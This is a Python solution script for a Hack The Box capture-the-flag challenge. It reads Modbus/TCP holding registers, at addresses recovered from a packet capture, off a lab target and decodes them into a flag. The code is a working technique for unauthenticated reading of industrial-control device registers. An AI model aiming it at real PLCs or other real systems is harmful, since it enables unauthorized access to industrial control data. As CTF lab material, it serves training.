#!/usr/bin/env python3
"""Read the candidate sensitive Modbus holding registers from the HTB instance."""

import argparse
import re
import socket
import sys
import time

from umodbus import conf
from umodbus.client import tcp


# Addresses recovered, in chronological order, from function-code 0x10
# responses in network_logs.pcapng. Do not sort or deduplicate this list.
REGISTER_ADDRESSES = [
    6, 10, 12, 21, 22, 26, 47, 53, 63, 77, 83, 86, 89, 95,
    96, 104, 123, 128, 131, 134, 139, 143, 144, 145, 153, 163,
    168, 173, 179, 193, 206, 210, 214, 215, 219, 221, 224, 225,
    226, 231, 239, 253,
]

DEFAULT_UNIT_ID = 52  # 0x34 in the captured Modbus/TCP traffic


def parse_args():
    parser = argparse.ArgumentParser(
        description="Read the candidate flag registers from the HTB Intrusion instance."
    )
    parser.add_argument("host", help="Current HTB target host/IP")
    parser.add_argument("port", type=int, help="Current HTB target TCP port")
    parser.add_argument(
        "--unit-id",
        type=int,
        default=DEFAULT_UNIT_ID,
        help=f"Modbus Unit/Slave ID (default: {DEFAULT_UNIT_ID})",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.05,
        help="Delay between requests in seconds (default: 0.05)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=5.0,
        help="Socket timeout in seconds (default: 5)",
    )
    return parser.parse_args()


def decode_and_print(values):
    """Show common interpretations of the 16-bit register values."""
    low_bytes = bytes(value & 0xFF for value in values)
    big_endian = b"".join((value & 0xFFFF).to_bytes(2, "big") for value in values)
    little_endian = b"".join(
        (value & 0xFFFF).to_bytes(2, "little") for value in values
    )

    candidates = {
        "one byte per register": low_bytes,
        "two bytes/register, big-endian": big_endian,
        "two bytes/register, little-endian": little_endian,
    }

    print("\n[+] Register values:")
    print(values)

    for label, raw in candidates.items():
        cleaned = raw.rstrip(b"\x00")
        decoded = cleaned.decode("utf-8", errors="replace")
        print(f"\n[+] {label}:")
        print(repr(decoded))

        match = re.search(rb"HTB\{[^}\r\n]+\}", cleaned)
        if match:
            print(f"\n[FLAG] {match.group().decode('ascii', errors='replace')}")
            return

    print("\n[-] No complete HTB{...} pattern was detected automatically.")
    print("    Check the raw values and confirm that the instance is current.")


def main():
    args = parse_args()
    conf.SIGNED_VALUES = False

    if not 0 <= args.unit_id <= 255:
        raise SystemExit("Unit ID must be between 0 and 255")
    if not 1 <= args.port <= 65535:
        raise SystemExit("Port must be between 1 and 65535")

    print(f"[*] Connecting to {args.host}:{args.port} (Unit ID {args.unit_id})")
    print(f"[*] Reading {len(REGISTER_ADDRESSES)} holding registers")

    values = []

    try:
        with socket.create_connection(
            (args.host, args.port), timeout=args.timeout
        ) as sock:
            sock.settimeout(args.timeout)

            for position, address in enumerate(REGISTER_ADDRESSES, start=1):
                command = tcp.read_holding_registers(
                    slave_id=args.unit_id,
                    starting_address=address,
                    quantity=1,
                )
                response = tcp.send_message(command, sock)

                if not response:
                    raise RuntimeError(f"Empty response for register {address}")

                value = int(response[0])
                values.append(value)
                printable = chr(value) if 32 <= value <= 126 else "."
                print(
                    f"[{position:02d}/{len(REGISTER_ADDRESSES)}] "
                    f"register={address:3d} value={value:5d} "
                    f"hex=0x{value & 0xFFFF:04x} char={printable!r}"
                )

                if args.delay > 0:
                    time.sleep(args.delay)

    except (ConnectionError, OSError, RuntimeError) as exc:
        print(f"\n[!] Error: {exc}", file=sys.stderr)
        print(
            "[!] Verify that the HTB instance is running and that host/port are current.",
            file=sys.stderr,
        )
        return 1

    decode_and_print(values)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
